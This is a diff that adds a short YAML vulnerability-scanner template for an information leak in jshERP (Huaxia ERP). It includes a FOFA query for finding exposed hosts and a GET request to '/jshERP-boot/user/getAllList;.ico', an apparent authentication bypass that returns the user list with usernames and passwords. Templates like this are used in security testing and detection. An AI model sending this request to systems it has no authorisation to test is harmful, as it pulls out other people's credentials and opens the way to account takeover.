@@ -1,0 +1,16 @@
+expression: r0()
+id: huaxia-jsherp-info-leak
+info:
+  author: lei_sec
+  description: "FOFA\uFF1Abody=\"jshERP\"\n"
+  name: "\u534E\u590F ERP \u4FE1\u606F\u6CC4\u9732"
+  severity: high
+  verified: true
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b'"code":') && response.body.bcontains(b'"data":')
+      && response.body.bcontains(b'"userList":') && response.body.bcontains(b'"username":')
+      && response.body.bcontains(b'"password":')
+    request:
+      method: GET
+      path: /jshERP-boot/user/getAllList;.ico
